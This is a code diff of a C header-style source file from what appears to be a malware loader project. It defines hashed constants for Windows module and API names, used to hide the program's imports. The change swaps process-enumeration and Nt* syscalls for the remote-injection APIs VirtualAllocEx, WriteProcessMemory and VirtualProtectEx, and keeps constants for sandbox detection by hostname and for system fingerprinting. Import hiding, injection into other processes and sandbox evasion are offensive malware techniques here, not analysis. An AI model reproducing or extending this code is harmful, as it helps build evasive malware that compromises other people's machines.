@@ -1,21 +1,13 @@
 #include "definitions.h"
 
 // Hashes for module names
-const ObjHash NTDLL_HASH = %MODHASH__ntdll.dll%;
 const ObjHash USER32_HASH = %MODHASH__user32.dll%;
 const ObjHash KERNEL32_HASH = %MODHASH__kernel32.dll%;
 
-// Hash for the target process name
-const ObjHash TARGET_PROCESS_NAME_HASH = %FCTHASH__target_process%;
-
 // Hashes for function names
 const ObjHash LOAD_LIBRARY_HASH = %FCTHASH__LoadLibraryA%;
+const ObjHash GET_PROC_ADDRESS_HASH = %FCTHASH__GetProcAddress%;
 const ObjHash QUERY_INFORMATION_PROCESS_HASH = %FCTHASH__NtQueryInformationProcess%;
-const ObjHash PROC32_FIRST_HASH = %FCTHASH__Process32First%;
-const ObjHash PROC32_NEXT_HASH = %FCTHASH__Process32Next%;
-const ObjHash OPEN_PROCESS_HASH = %FCTHASH__OpenProcess%;
-const ObjHash CLOSE_HANDLE_HASH = %FCTHASH__CloseHandle%;
-const ObjHash CREATE_TOOLHELP32_SNAPSHOT_HASH = %FCTHASH__CreateToolhelp32Snapshot%;
 
 // Hashes for system information functions
 const ObjHash GET_COMPUTER_NAME_HASH = %FCTHASH__GetComputerNameA%;
@@ -29,11 +21,9 @@ const ObjHash GET_SYSTEM_DEFAULT_LANGID_HASH = %FCTHASH__GetSystemDefaultLangID%
 const ObjHash GET_SYSTEM_DEFAULT_LCID_HASH = %FCTHASH__GetSystemDefaultLCID%;
 
 // Hashes for memory and thread management functions
-const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__NtAllocateVirtualMemory%;
-const ObjHash WRITE_MEMORY_HASH = %FCTHASH__NtWriteVirtualMemory%;
-const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__NtProtectVirtualMemory%;
-const ObjHash CREATE_THREAD_HASH = %FCTHASH__NtCreateThreadEx%;
-const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH = %FCTHASH__NtWaitForSingleObject%;
+const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__VirtualAllocEx%;
+const ObjHash WRITE_MEMORY_HASH = %FCTHASH__WriteProcessMemory%;
+const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__VirtualProtectEx%;
 
 // Hashes for sandbox detection
 const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
